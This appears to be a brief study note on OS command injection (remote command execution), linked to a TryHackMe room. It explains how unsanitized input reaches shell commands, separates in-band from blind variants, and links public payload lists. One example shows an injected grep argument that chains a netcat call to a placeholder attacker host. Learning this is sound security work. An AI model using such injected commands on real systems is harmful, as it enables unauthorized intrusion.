# Remote command execution (RCE)

[![oscommandinjection](../../../_badges/thmp/oscommandinjection.svg)](https://tryhackme.com/room/oscommandinjection)

<div class="row row-cols-md-2"><div>

Some websites may use the underlying system to run commands. For instance, a website on Linux might use `grep`, `sed`, or other utilities to do things faster/easier. A **remote command execution** (RCE), or in short **command injection**, occur when a developer use user input in such commands without proper sanitization/measures.

`grep $injectable reports/` $\to$ `grep -V; nc hacker_ip port #reports/`

> See [PayloadsAllTheThings/Command injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)<br>
> See [command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)
</div><div>

As always, there are

* **Regular/in-band RCE**: the user receive the result of the command
* **Blind/out-band RCE**: the hacker must use another way to know the result.
  * Using redirections/flags, create a URL-accessible output file
  * Using commands such as `sleep`/... to do a time-based attack
</div></div>